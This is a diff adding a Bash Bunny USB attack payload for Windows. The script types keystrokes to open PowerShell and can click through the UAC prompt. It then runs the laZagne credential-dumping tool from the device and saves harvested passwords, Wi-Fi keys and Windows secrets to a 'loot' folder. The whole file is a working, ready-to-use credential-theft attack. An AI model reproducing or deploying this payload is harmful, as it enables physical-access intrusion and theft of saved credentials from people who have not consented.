@@ -1,0 +1,78 @@
+#!/bin/bash
+#
+# Title:         laZagne for Bash Bunny
+# Author:        GermanNoob
+# Version:       1.0
+# Target:		 Windows
+#
+# Scans target with laZagne
+# Saves sequential logs to mass storage loot folder
+#
+# Blue ...........Setup
+# Amber blinking..Attack ongoing
+# Purple blinking..Cleaing up
+# Green..........Finished
+# 
+LED B
+
+# Set language & attackmode
+Q SET_LANGUAGE de
+ATTACKMODE HID STORAGE
+
+# Create directory to dump infos
+mkdir -p /root/udisk/loot/laZagne
+mkdir -p /root/udisk/loot/laZagne/runningscan
+mkdir -p /root/udisk/loot/laZagne/finishedscan
+sync
+
+# Source bunny_helpers.sh to get environment variable SWITCH_POSITION
+source bunny_helpers.sh
+
+# Run with admin-priviliges to get wifipasswords & windows secrets
+# true = User has admin priviliges
+# false = standard user
+ADMIN=false
+
+# Check if powershell should be started as admin
+LED G R 500
+Q GUI r
+Q DELAY 100
+if [ $ADMIN = true ]; then 
+	Q STRING powershell Start-Process powershell -Verb runAs
+	Q ENTER
+
+	# Bypass UAC
+	Q DELAY 3000
+	Q LEFT
+	Q ENTER
+	Q DELAY 500;
+else
+	# Start powershell without admin priviliges
+	Q STRING powershell
+	Q ENTER
+	Q DELAY 1500;
+fi
+
+# Start attack  laZagne
+QUACK STRING ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\\${SWITCH_POSITION}\l.cmd')"
+Q DELAY 100
+Q ENTER
+
+# Wait for laZagne to finish, cleanup and exit
+
+while [ ! "$(ls -A /root/udisk/loot/laZagne/finishedscan)" ]; do
+	sleep 1
+done
+
+LED R B 200
+
+# Close shell
+Q STRING exit
+Q ENTER
+
+# move scanresult to laZagne Folder
+mv /root/udisk/loot/laZagne/finishedscan/* /root/udisk/loot/laZagne/ >> /tmp/laZAgne.log
+
+sync
+
+LED G
